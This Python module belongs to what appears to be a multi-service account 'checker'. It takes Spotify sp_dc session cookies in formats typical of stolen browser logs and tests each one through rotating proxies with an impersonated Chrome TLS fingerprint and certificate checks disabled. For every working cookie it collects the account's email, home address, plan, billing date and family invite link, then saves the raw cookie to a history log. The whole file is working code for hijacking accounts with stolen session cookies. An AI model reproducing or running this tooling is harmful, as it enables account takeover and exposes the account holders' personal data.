import json
import logging
import re
import requests
from checkers.netflix import normalize_country
from modules.db import save_history
from modules.proxy_manager import get_random_proxy, mark_proxy_cooldown
from modules.tls_engine import create_tls_session

SPOTIFY_PLAN_MAP = {
    'duo_premium': 'Duo Premium',
    'family_premium_v2': 'Family Premium',
    'family_basic': 'Family Basic',
    'premium': 'Premium',
    'premium_mini': 'Premium Mini',
    'basic_premium': 'Premium Basic',
    'student_premium': 'Student Premium',
    'student_premium_hulu': 'Student Premium (Hulu)',
    'free': 'Free',
}

SPOTIFY_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
}

def extract_spotify_sp_dc(cookie_text):
    """Parse sp_dc from Netscape .txt, JSON array, or raw sp_dc=XXX string."""
    if not cookie_text:
        return None
    text = str(cookie_text).strip()

    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n = c.get("name", "")
                        v = c.get("value", "")
                        if n == "sp_dc" and v:
                            return v
        except Exception:
            pass

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] == "sp_dc":
            return parts[6]

    m = re.search(r'(?:^|[;\s])sp_dc=([^\s;,]+)', text)
    if m:
        return m.group(1)

    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
        return text

    return None

def check_spotify_cookie(cookie_text, use_proxy=True):
    """Check a Spotify account using sp_dc cookie."""
    sp_dc = extract_spotify_sp_dc(cookie_text)
    if not sp_dc:
        save_history("spotify", "DEAD", raw_cookie=cookie_text)
        return {"status": "DEAD", "reason": "sp_dc cookie not found in input."}

    route = "Direct"
    proxies = None
    proxy_raw_url = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
            proxy_raw_url = proxy_result[2]

    session = create_tls_session(impersonate="chrome131")
    session.verify = False
    session.headers.update(SPOTIFY_HEADERS)
    session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")

    if proxies:
        session.proxies = proxies

    result = {
        "status": "DEAD",
        "plan": "",
        "email": "",
        "country": "",
        "is_owner": None,
        "free_slots": None,
        "invite_link": "",
        "address": "",
        "is_child_account": False,
        "next_payment_date": "",
        "route": route,
    }

    try:
        r = session.get("https://www.spotify.com/us/account/overview/", timeout=15, allow_redirects=True)

        if r.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        if "login" in r.url.lower() or r.status_code in (401, 403):
            session.close()
            save_history("spotify", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": "Cookie expired / redirected to login.", "route": route}

        html = r.text

        plan_raw = ""
        plan_match = re.search(r'"currentPlan"\s*:\s*"([^"]+)"', html)
        if not plan_match:
            plan_match = re.search(r'"plan"\s*:\s*"([^"]+)"', html)
        if not plan_match:
            plan_match = re.search(r'"productName"\s*:\s*"([^"]+)"', html)
        if plan_match:
            plan_raw = plan_match.group(1).strip()

        plan_name = SPOTIFY_PLAN_MAP.get(plan_raw.lower(), plan_raw.replace('_', ' ').title() if plan_raw else '')

        logged_in = bool(re.search(r'"isLoggedIn"\s*:\s*true', html, re.I))
        if not logged_in:
            logged_in = bool(re.search(r'"loggedIn"\s*:\s*true', html, re.I))

        country_match = re.search(r'"country"\s*:\s*"([A-Za-z]{2})"', html)
        country = normalize_country(country_match.group(1)) if country_match else ""

        is_recurring_match = re.search(r'"isRecurring"\s*:\s*(true|false)', html, re.I)
        is_recurring = is_recurring_match.group(1).lower() == 'true' if is_recurring_match else None

        is_master_match = re.search(r'"isMaster"\s*:\s*(true|false)', html, re.I)
        is_master = is_master_match.group(1).lower() == 'true' if is_master_match else None

        is_sub_match = re.search(r'"isSubAccount"\s*:\s*(true|false)', html, re.I)
        is_sub_account = is_sub_match.group(1).lower() == 'true' if is_sub_match else False

        free_slots_match = re.search(r'"freeSlots"\s*:\s*(\d+)', html)
        free_slots = int(free_slots_match.group(1)) if free_slots_match else None

        invite_match = re.search(r'"inviteLink"\s*:\s*"([^"]+)"', html)
        invite_link = invite_match.group(1) if invite_match else ""

        address_match = re.search(r'"address"\s*:\s*"([^"]+)"', html)
        address = address_match.group(1) if address_match else ""

        payment_match = re.search(r'"nextPaymentDate"\s*:\s*"([^"]+)"', html)
        if not payment_match:
            payment_match = re.search(r'"nextBillingInfo"\s*:\s*"([^"]+)"', html)
        next_payment = payment_match.group(1) if payment_match else ""

        try:
            r2 = session.get("https://www.spotify.com/api/account-settings/v1/profile", timeout=12)
            if r2.status_code == 200:
                prof = r2.json()
                result["email"] = prof.get("email", "") or prof.get("username", "")
                if not country and prof.get("country"):
                    country = normalize_country(prof["country"])
        except Exception:
            pass

        family_members = []
        family_max = None
        try:
            r3 = session.get("https://www.spotify.com/api/family/v1/family/home", timeout=12)
            if r3.status_code == 200:
                fam = r3.json()
                family_members = fam.get("members", [])
                family_max = fam.get("maxCapacity")
                if fam.get("inviteToken") and not invite_link:
                    invite_link = f"https://www.spotify.com/family/join/invite/{fam['inviteToken']}"
                if fam.get("address") and not address:
                    addr_obj = fam["address"]
                    if isinstance(addr_obj, dict):
                        parts = [addr_obj.get("street", ""), addr_obj.get("city", ""),
                                 addr_obj.get("state", ""), addr_obj.get("postalCode", ""),
                                 addr_obj.get("country", "")]
                        address = ", ".join(p for p in parts if p)
                    elif isinstance(addr_obj, str):
                        address = addr_obj
                if is_master is None and family_members:
                    for mem in family_members:
                        if mem.get("isOwner") and mem.get("email") == result.get("email"):
                            is_master = True
                            break
                if free_slots is None and family_max is not None:
                    free_slots = max(0, family_max - len(family_members))
        except Exception:
            pass

        session.close()

        if not logged_in and not plan_raw and not result["email"]:
            status = "DEAD"
        elif plan_raw.lower() == 'free' or not plan_raw:
            status = "FREE"
            if not plan_name:
                plan_name = "Free"
        else:
            status = "LIVE"

        result.update({
            "status": status,
            "plan": plan_name,
            "country": country,
            "is_owner": is_master,
            "is_child_account": is_sub_account,
            "free_slots": free_slots,
            "invite_link": invite_link,
            "address": address,
            "next_payment_date": next_payment,
            "is_recurring": is_recurring,
            "family_members": len(family_members) if family_members else 0,
            "family_max_capacity": family_max,
        })

        billing = ""
        if next_payment:
            billing = f"Next: {next_payment}"
            if is_recurring:
                billing += " [Auto-renew]"
        elif is_recurring is False:
            billing = "Not recurring"

        save_history("spotify", status, plan=f"Spotify {plan_name}" if plan_name else "",
                     billing=billing, country=country, route=route,
                     raw_cookie=cookie_text, email=result.get("email", ""))

        return result

    except (requests.exceptions.ProxyError, requests.exceptions.Timeout) as e:
        session.close()
        if proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)
        if use_proxy:
            return check_spotify_cookie(cookie_text, use_proxy=False)
        save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}
    except Exception as e:
        session.close()
        save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}
